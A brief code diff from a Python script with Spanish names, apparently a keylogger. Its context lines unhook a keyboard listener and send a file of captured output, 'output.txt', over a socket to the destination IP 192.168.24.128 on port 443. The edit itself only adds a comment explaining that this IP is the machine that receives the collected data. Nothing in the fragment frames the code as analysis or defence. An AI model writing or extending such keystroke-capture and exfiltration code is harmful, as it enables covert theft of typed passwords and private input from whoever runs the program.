@@ -46,7 +46,7 @@ def detener_script():
     keyboard.unhook_all()
     enviar_archivo_via_sockets(archivo_a_enviar, direccion_ip_destino, puerto_destino)
 
-direccion_ip_destino ="192.168.24.128"
+direccion_ip_destino ="192.168.24.128" #utilizamos la ip de la maquina destino a quien enviaremos dichos datos
 puerto_destino = 443
 archivo_a_enviar = 'output.txt'
 
